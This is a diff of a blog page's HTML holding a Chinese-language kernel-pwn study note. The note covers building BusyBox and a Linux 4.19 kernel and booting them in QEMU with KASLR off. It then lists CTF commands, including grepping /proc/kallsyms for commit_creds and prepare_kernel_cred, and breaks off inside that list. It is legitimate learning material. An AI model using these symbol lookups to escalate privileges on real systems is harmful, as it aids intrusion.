@@ -1,535 +1,220 @@
-<!DOCTYPE html>
-<html lang="en">
-    <!-- title -->
-
-
-    
-
-<!-- keywords -->
-
-
-
+<!DOCTYPE HTML>
+<html>
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <meta name="author" content="nyyyddddn">
-    <meta name="renderer" content="webkit">
-    <meta name="copyright" content="nyyyddddn">
-    
-        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
-    
-    <meta name="description" content="">
-    <meta name="description" content="learn about kernel pwn 尝试编译kernel和文件系统，使用qemu启动step1:make filesystem (compile busybox)https:&#x2F;&#x2F;ctf-wiki.org&#x2F;pwn&#x2F;linux&#x2F;kernel-mode&#x2F;environment&#x2F;qemu-emulate&#x2F;#_3 下载busybox编译 123456wget https:&#x2F;&#x2F;busybox.net">
-<meta property="og:type" content="article">
-<meta property="og:title" content="尝试编译kernel和文件系统">
-<meta property="og:url" content="https://nyyyddddn.github.io/2024/03/31/%E5%B0%9D%E8%AF%95%E7%BC%96%E8%AF%91kernel%E5%92%8C%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/index.html">
-<meta property="og:site_name" content="nyyyddddn">
-<meta property="og:description" content="learn about kernel pwn 尝试编译kernel和文件系统，使用qemu启动step1:make filesystem (compile busybox)https:&#x2F;&#x2F;ctf-wiki.org&#x2F;pwn&#x2F;linux&#x2F;kernel-mode&#x2F;environment&#x2F;qemu-emulate&#x2F;#_3 下载busybox编译 123456wget https:&#x2F;&#x2F;busybox.net">
-<meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2024-03-31T13:56:28.000Z">
-<meta property="article:modified_time" content="2024-08-24T17:07:37.767Z">
-<meta property="article:author" content="nyyyddddn">
-<meta property="article:tag" content="misc">
-<meta name="twitter:card" content="summary">
-    <meta http-equiv="Cache-control" content="no-cache">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <link rel="icon" href="/null">
-    
-    <title>尝试编译kernel和文件系统 · nyyyddddn&#39;s blog</title>
-    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
-/* This file is meant as a standalone workflow for
-- testing support for link[rel=preload]
-- enabling async CSS loading in browsers that do not support rel=preload
-- applying rel preload css once loaded, whether supported or not.
-*/ -->
-<script>
-    (function (w) {
-        'use strict'
-        // rel=preload support test
-        if (!w.loadCSS) {
-            w.loadCSS = function () {}
-        }
-        // define on the loadCSS obj
-        var rp = (loadCSS.relpreload = {})
-        // rel=preload feature support test
-        // runs once and returns a function for compat purposes
-        rp.support = (function () {
-            var ret
-            try {
-                ret = w.document.createElement('link').relList.supports('preload')
-            } catch (e) {
-                ret = false
-            }
-            return function () {
-                return ret
-            }
-        })()
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>尝试编译kernel和文件系统 | nyyyddddn</title>
+  <meta name="author" content="nyyyddddn">
+  
+  <meta name="description" content="learn about kernel pwn
+尝试编译kernel和文件系统，使用qemu启动step1:make filesystem (compile busybox)https://ctf-wiki.org/pwn/linux/kernel-mode/environment/qemu-emulate/#_3
+下载busybox编译
+wget https:&amp;#x2F;&amp;#x2F;busybox.net&amp;#x2F;downloads&amp;#x2F;busybox-1.32.1.tar.bz2
+tar -jxf busybox-1.32.1.tar.bz2
 
-        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
-        // then change that media back to its intended value on load
-        rp.bindMediaToggle = function (link) {
-            // remember existing media attr for ultimate state, or default to 'all'
-            var finalMedia = link.media || 'all'
+make menuconfig &amp;#x2F;&amp;#x2F; 在Setting中把build static binay勾选 静态链接
+make -j4
+make install
 
-            function enableStylesheet() {
-                link.media = finalMedia
-            }
+在make install后可以看到busybox文件夹中多出来一个_install 文件夹， _install文件夹中有
+lhj@lhj-virtual-machine:~&amp;#x2F;Desktop&amp;#x2F;nydn_kernel_learn&amp;#x2F;busybox-1.32.1&amp;#x2F;_install$ ls
+bin  linuxrc  sbin  usr
 
-            // bind load handlers to enable media
-            if (link.addEventListener) {
-                link.addEventListener('load', enableStylesheet)
-            } else if (link.attachEvent) {
-                link.attachEvent('onload', enableStylesheet)
-            }
+创建必要的文件夹
+lhj@lhj-virtual-machine:~&amp;#x2F;Desktop&amp;#x2F;nydn_kernel_learn&amp;#x2F;busybox-1.32.1&amp;#x2F;_install$ mkdir -p  proc sys dev etc&amp;#x2F;init.d
+lhj@lhj-virtual-machine:~&amp;#x2F;Desktop&amp;#x2F;nydn_kernel_learn&amp;#x2F;busybox-1.32.1&amp;#x2F;_install$ ls
+bin  dev  etc  linuxrc  proc  sbin  sys  usr"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-            // Set rel and non-applicable media type to start an async request
-            // note: timeout allows this to happen async to let rendering continue in IE
-            setTimeout(function () {
-                link.rel = 'stylesheet'
-                link.media = 'only x'
-            })
-            // also enable media after 3 seconds,
-            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
-            setTimeout(enableStylesheet, 3000)
-        }
+  <meta property="og:title" content="尝试编译kernel和文件系统"/>
+  <meta property="og:site_name" content="nyyyddddn"/>
 
-        // loop through link elements in DOM
-        rp.poly = function () {
-            // double check this to prevent external calls from running
-            if (rp.support()) {
-                return
-            }
-            var links = w.document.getElementsByTagName('link')
-            for (var i = 0; i < links.length; i++) {
-                var link = links[i]
-                // qualify links to those with rel=preload and as=style attrs
-                if (
-                    link.rel === 'preload' &&
-                    link.getAttribute('as') === 'style' &&
-                    !link.getAttribute('data-loadcss')
-                ) {
-                    // prevent rerunning on link
-                    link.setAttribute('data-loadcss', true)
-                    // bind listeners to toggle media back
-                    rp.bindMediaToggle(link)
-                }
-            }
-        }
+  
+    <meta property="og:image" content=""/>
+  
 
-        // if unsupported, run the polyfill
-        if (!rp.support()) {
-            // run once at least
-            rp.poly()
+  
+    <link rel="alternative" href="/atom.xml" title="nyyyddddn" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
 
-            // rerun poly on an interval until onload
-            var run = w.setInterval(rp.poly, 500)
-            if (w.addEventListener) {
-                w.addEventListener('load', function () {
-                    rp.poly()
-                    w.clearInterval(run)
-                })
-            } else if (w.attachEvent) {
-                w.attachEvent('onload', function () {
-                    rp.poly()
-                    w.clearInterval(run)
-                })
-            }
-        }
+  <script src="/js/jquery-2.0.3.min.js"></script>
 
-        // commonjs
-        if (typeof exports !== 'undefined') {
-            exports.loadCSS = loadCSS
-        } else {
-            w.loadCSS = loadCSS
-        }
-    })(typeof global !== 'undefined' ? global : this)
-</script>
+  <!-- analytics -->
+  
 
-    <style type="text/css">
-    @font-face {
-        font-family: 'Oswald-Regular';
-        src: url("/font/Oswald-Regular.ttf");
-    }
 
-    body {
-        margin: 0;
-    }
 
-    header,
-    footer,
-    .back-top,
-    .sidebar,
-    .container,
-    .site-intro-meta,
-    .toc-wrapper {
-        display: none;
-    }
 
-    .site-intro {
-        position: relative;
-        z-index: 3;
-        width: 100%;
-        /* height: 50vh; */
-        overflow: hidden;
-    }
-
-    .site-intro-placeholder {
-        position: absolute;
-        z-index: -2;
-        top: 0;
-        left: 0;
-        width: calc(100% + 300px);
-        height: 100%;
-        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
-        background-position: center center;
-        transform: translate3d(-226px, 0, 0);
-        animation: gradient-move 2.5s ease-out 0s infinite;
-    }
-
-    @keyframes gradient-move {
-        0% {
-            transform: translate3d(-226px, 0, 0);
-        }
-        100% {
-            transform: translate3d(0, 0, 0);
-        }
-    }
-</style>
-
-    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
-    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
-    <link rel="stylesheet" href="/css/dark.css">
-    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
-    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
-    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
-    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
-    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
-    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
-    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
-    <!-- algolia -->
-    
-    <!-- 百度统计  -->
-    
-    <!-- 谷歌统计  -->
-    
 <meta name="generator" content="Hexo 6.3.0"></head>
 
-    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
-    <script type="text/javascript">
-        if (typeof window.$ == undefined) {
-            console.warn('jquery load from jsdelivr failed, will load local script')
-            document.write('<script src="/lib/jquery.min.js" />')
-        }
-    </script>
-    
-        <body class="post-body">
-    
-        <!-- header -->
-        <header class="header header-mobile">
-    <!-- top read progress line -->
-    <div class="header-element">
-        <div class="read-progress"></div>
-    </div>
-    <!-- sidebar menu button -->
-    <div class="header-element">
-        
-            <div class="header-sidebar-menu">
-        
-            
-                <div style="padding-left: 1px;">&#xe775;</div>
-            
-        </div>
-    </div>
-    <!-- header actions -->
-    <div class="header-actions">
-        <!-- theme mode switch button -->
-        <span class="header-theme-btn header-element">
-            <i class="fas fa-adjust"></i>
-        </span>
-        <!-- back to home page text -->
-        <span class="home-link header-element">
-            <a href=/>nyyyddddn</a>
-        </span>
-    </div>
-    <!-- toggle banner for post layout -->
-    
-        
-            <div class="banner">
-        
-            <div class="blog-title header-element">
-                <a href="/">nyyyddddn</a>
-            </div>
-            <div class="post-title header-element">
-                <a href="#" class="post-name">尝试编译kernel和文件系统</a>
-            </div>
-        </div>
-    
-</header>
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">nyyyddddn</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/catergories" title="All the catergories.">
+			  <i class=""></i>Catergories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
 
-        <!-- fixed footer -->
-        <footer class="footer-fixed">
-    <!-- back to top button -->
-    <div class="footer-fixed-element">
-        
-            <div class="back-top back-top-hidden">
-        
-        
-            <div>&#xe639;</div>
-        
-        </div>
-    </div>
-</footer>
+  <div class="container">
+  	<div class="content">
+    	 
 
-        <!-- wrapper -->
-        <div class="wrapper">
-            <div class="site-intro" style="
+
+	
+		<div class="page-header">
+			<h1> 尝试编译kernel和文件系统</h1>
+		</div>
+	
 
 
 
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
 
+	<!-- content -->
+	<div class="mypage">		
+	  		
 
-
-
-    height:50vh;
-
-">
-    
-    <!-- 主页  -->
-    
-        
-    <!-- 404页  -->
-    
-    <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
-    <div class="site-intro-meta">
-        <!-- 标题  -->
-        <h1 class="intro-title">
-            <!-- 主页  -->
-            
-                尝试编译kernel和文件系统
-            <!-- 404 -->
-            
-        </h1>
-        <!-- 副标题 -->
-        <p class="intro-subtitle">
-            <!-- 主页副标题  -->
-            
-                
-            <!-- 404 -->
-            
-        </p>
-        <!-- 文章页 meta -->
-        
-            <div class="post-intros">
-                <!-- 文章页标签  -->
-                
-                    <div class= post-intro-tags >
-    
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="misc">misc</a>
-    
-</div>
-
-                
-                <!-- 文章字数统计 -->
-                
-                <div class="post-intro-meta">
-                    <!-- 撰写日期 -->
-                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
-                    <span class="post-intro-time">2024/03/31</span>
-                    <!-- busuanzi -->
-                    
-                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
-                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
-                            <span id="busuanzi_value_page_pv"></span>
-                        </span>
-                    
-                    <!-- 文章分享 -->
-                    <span class="share-wrapper">
-                        <span class="iconfont-archer share-icon">&#xe71d;</span>
-                        <span class="share-text">Share</span>
-                        <ul class="share-list">
-                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
-                                <div class="share-qrcode"></div>
-                            </li>
-                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
-                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
-                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
-                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
-                        </ul>
-                    </span>
-                </div>
-            </div>
-        
-    </div>
-</div>
-
-            <script>
-  // get user agent
-  function getBrowserVersions() {
-    var u = window.navigator.userAgent
-    return {
-      userAgent: u,
-      trident: u.indexOf('Trident') > -1, //IE内核
-      presto: u.indexOf('Presto') > -1, //opera内核
-      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
-      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
-      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
-      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
-      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
-      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
-      iPad: u.indexOf('iPad') > -1, //是否为iPad
-      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
-      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
-      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
-    }
-  }
-  var browser = {
-    versions: getBrowserVersions(),
-  }
-  console.log('userAgent: ' + browser.versions.userAgent)
-
-  // callback
-  function fontLoaded() {
-    console.log('font loaded')
-    if (document.getElementsByClassName('site-intro-meta')) {
-      document
-        .getElementsByClassName('intro-title')[0]
-        .classList.add('intro-fade-in')
-      document
-        .getElementsByClassName('intro-subtitle')[0]
-        .classList.add('intro-fade-in')
-      var postIntros = document.getElementsByClassName('post-intros')[0]
-      if (postIntros) {
-        postIntros.classList.add('post-fade-in')
-      }
-    }
-  }
-
-  // UC不支持跨域，所以直接显示
-  function asyncCb() {
-    if (browser.versions.uc) {
-      console.log('UCBrowser')
-      fontLoaded()
-    } else {
-      WebFont.load({
-        custom: {
-          families: ['Oswald-Regular'],
-        },
-        loading: function () {
-          // 所有字体开始加载
-          // console.log('font loading');
-        },
-        active: function () {
-          // 所有字体已渲染
-          fontLoaded()
-        },
-        inactive: function () {
-          // 字体预加载失败，无效字体或浏览器不支持加载
-          console.log('inactive: timeout')
-          fontLoaded()
-        },
-        timeout: 5000, // Set the timeout to two seconds
-      })
-    }
-  }
-
-  function asyncErr() {
-    console.warn('script load from CDN failed, will load local script')
-  }
-
-  // load webfont-loader async, and add callback function
-  function async(u, cb, err) {
-    var d = document,
-      t = 'script',
-      o = d.createElement(t),
-      s = d.getElementsByTagName(t)[0]
-    o.src = u
-    if (cb) {
-      o.addEventListener(
-        'load',
-        function (e) {
-          cb(null, e)
-        },
-        false
-      )
-    }
-    if (err) {
-      o.addEventListener(
-        'error',
-        function (e) {
-          err(null, e)
-        },
-        false
-      )
-    }
-    s.parentNode.insertBefore(o, s)
-  }
-
-  var asyncLoadWithFallBack = function (arr, success, reject) {
-    var currReject = function () {
-      reject()
-      arr.shift()
-      if (arr.length) async(arr[0], success, currReject)
-    }
-
-    async(arr[0], success, currReject)
-  }
-
-  asyncLoadWithFallBack(
-    [
-      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
-      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
-      "/lib/webfontloader.min.js",
-    ],
-    asyncCb,
-    asyncErr
-  )
-</script>
-
-            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
-            <div class="container container-unloaded">
-                <main class="main post-page">
-    <article class="article-entry">
-        <p>learn about kernel pwn</p>
+	  <p>learn about kernel pwn</p>
 <h1 id="尝试编译kernel和文件系统，使用qemu启动"><a href="#尝试编译kernel和文件系统，使用qemu启动" class="headerlink" title="尝试编译kernel和文件系统，使用qemu启动"></a>尝试编译kernel和文件系统，使用qemu启动</h1><h2 id="step1-make-filesystem-compile-busybox"><a href="#step1-make-filesystem-compile-busybox" class="headerlink" title="step1:make filesystem (compile busybox)"></a>step1:make filesystem (compile busybox)</h2><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/environment/qemu-emulate/#_3">https://ctf-wiki.org/pwn/linux/kernel-mode/environment/qemu-emulate/#_3</a></p>
 <p>下载busybox编译</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://busybox.net/downloads/busybox-1.32.1.tar.bz2</span><br><span class="line">tar -jxf busybox-1.32.1.tar.bz2</span><br><span class="line"></span><br><span class="line">make menuconfig // 在Setting中把build static binay勾选 静态链接</span><br><span class="line">make -j4</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">wget https:&#x2F;&#x2F;busybox.net&#x2F;downloads&#x2F;busybox-1.32.1.tar.bz2
+tar -jxf busybox-1.32.1.tar.bz2
+
+make menuconfig &#x2F;&#x2F; 在Setting中把build static binay勾选 静态链接
+make -j4
+make install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>在make install后可以看到busybox文件夹中多出来一个_install 文件夹， _install文件夹中有</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lhj@lhj-virtual-machine:~/Desktop/nydn_kernel_learn/busybox-1.32.1/_install$ ls</span><br><span class="line">bin  linuxrc  sbin  usr</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">lhj@lhj-virtual-machine:~&#x2F;Desktop&#x2F;nydn_kernel_learn&#x2F;busybox-1.32.1&#x2F;_install$ ls
+bin  linuxrc  sbin  usr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>创建必要的文件夹</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lhj@lhj-virtual-machine:~/Desktop/nydn_kernel_learn/busybox-1.32.1/_install$ mkdir -p  proc sys dev etc/init.d</span><br><span class="line">lhj@lhj-virtual-machine:~/Desktop/nydn_kernel_learn/busybox-1.32.1/_install$ ls</span><br><span class="line">bin  dev  etc  linuxrc  proc  sbin  sys  usr</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">lhj@lhj-virtual-machine:~&#x2F;Desktop&#x2F;nydn_kernel_learn&#x2F;busybox-1.32.1&#x2F;_install$ mkdir -p  proc sys dev etc&#x2F;init.d
+lhj@lhj-virtual-machine:~&#x2F;Desktop&#x2F;nydn_kernel_learn&#x2F;busybox-1.32.1&#x2F;_install$ ls
+bin  dev  etc  linuxrc  proc  sbin  sys  usr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>在根目录下创建init文件，文件系统初始化的时候会调用这个文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo &quot;INIT SCRIPT&quot;</span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">echo -e &quot;Boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds&quot;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;sh
+echo &quot;INIT SCRIPT&quot;
+mkdir &#x2F;tmp
+mount -t proc none &#x2F;proc
+mount -t sysfs none &#x2F;sys
+mount -t devtmpfs none &#x2F;dev
+mount -t debugfs none &#x2F;sys&#x2F;kernel&#x2F;debug
+mount -t tmpfs none &#x2F;tmp
+echo -e &quot;Boot took $(cut -d&#39; &#39; -f1 &#x2F;proc&#x2F;uptime) seconds&quot;
+setsid &#x2F;bin&#x2F;cttyhack setuidgid 1000 &#x2F;bin&#x2F;sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>打包成cpio文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.cpio</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">find . | cpio -o --format&#x3D;newc &gt; ..&#x2F;rootfs.cpio<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>cpio解压的命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -idmv &lt; rootfs.img</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">cpio -idmv &lt; rootfs.img<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
 
 <h2 id="step2-download-compile-kernel"><a href="#step2-download-compile-kernel" class="headerlink" title="step2:download &amp; compile kernel"></a>step2:download &amp; compile kernel</h2><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/environment/build-kernel/">https://ctf-wiki.org/pwn/linux/kernel-mode/environment/build-kernel/</a></p>
 <p>缺少证书报错的解决方法 <a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_47696151/article/details/121574718">https://blog.csdn.net/m0_47696151/article/details/121574718</a> </p>
 <p>在 <a target="_blank" rel="noopener" href="https://mirrors.tuna.tsinghua.edu.cn/kernel/%E4%B8%AD%E4%B8%8B%E8%BD%BDkernel">https://mirrors.tuna.tsinghua.edu.cn/kernel/中下载kernel</a></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lhj@lhj-virtual-machine:~/Desktop/nydn_kernel_learn/level1$ file bzImage</span><br><span class="line">bzImage: Linux kernel x86 boot executable bzImage, version 4.19.0 (bird@ubuntu18) #1 SMP Thu Nov 1 16:50:59 CST 2018, RO-rootFS, swap_dev 0X8, Normal VGA</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">lhj@lhj-virtual-machine:~/Desktop/nydn_kernel_learn/level1$ <span class="token function">file</span> bzImage
+bzImage: Linux kernel x86 boot executable bzImage, version <span class="token number">4.19</span>.0 <span class="token punctuation">(</span>bird@ubuntu18<span class="token punctuation">)</span> <span class="token comment">#1 SMP Thu Nov 1 16:50:59 CST 2018, RO-rootFS, swap_dev 0X8, Normal VGA</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>解压并编译内核，缺少证书的话上面有解决方法</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf linux-4.19.1.tar.gz</span><br><span class="line">make menuconfig // 直接save 生成.config配置文件</span><br><span class="line">make -j4 bzImage</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">tar -xzvf linux-4.19.1.tar.gz
+make menuconfig &#x2F;&#x2F; 直接save 生成.config配置文件
+make -j4 bzImage<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>编译成功后的信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Setup is 17148 bytes (padded to 17408 bytes).</span><br><span class="line">System is 8445 kB</span><br><span class="line">CRC b1100637</span><br><span class="line">Kernel: arch/x86/boot/bzImage is ready  (#1)</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">Setup is 17148 bytes (padded to 17408 bytes).
+System is 8445 kB
+CRC b1100637
+Kernel: arch&#x2F;x86&#x2F;boot&#x2F;bzImage is ready  (#1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h2 id="step3-write-a-script-to-start-qemu"><a href="#step3-write-a-script-to-start-qemu" class="headerlink" title="step3: write a script to start qemu"></a>step3: write a script to start qemu</h2><p>这篇文章中有对一些常见的qemu参数的解释</p>
 <p><a target="_blank" rel="noopener" href="https://lantern.cool/note-pwn-kernel-environment/">https://lantern.cool/note-pwn-kernel-environment/</a> </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append &#x27;console=ttyS0 loglevel=3 oops=panic panic=1 nokaslr&#x27; \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd initramfs.cpio \</span><br><span class="line">    -smp cores=1,threads=1 \</span><br><span class="line">    -cpu qemu64 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;bash
+
+qemu-system-x86_64 \
+    -m 64M \
+    -nographic \
+    -kernel bzImage \
+    -append &#39;console&#x3D;ttyS0 loglevel&#x3D;3 oops&#x3D;panic panic&#x3D;1 nokaslr&#39; \
+    -monitor &#x2F;dev&#x2F;null \
+    -initrd initramfs.cpio \
+    -smp cores&#x3D;1,threads&#x3D;1 \
+    -cpu qemu64 2&gt;&#x2F;dev&#x2F;null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h1 id="ctf-challenge"><a href="#ctf-challenge" class="headerlink" title="ctf challenge"></a>ctf challenge</h1><p>常用命令:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">lsmod 查看已经安装的驱动</span><br><span class="line">insmod 安装驱动</span><br><span class="line"></span><br><span class="line">cat /proc/modules 查看当前加载模块的地址 信息</span><br><span class="line"></span><br><span class="line">grep prepare_kernel_cred  /proc/kallsyms 从内核符号表中查找符号</span><br><span class="line">grep commit_creds /proc/kallsyms</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">lsmod 查看已经安装的驱动
+insmod 安装驱动
+
+cat &#x2F;proc&#x2F;modules 查看当前加载模块的地址 信息
+
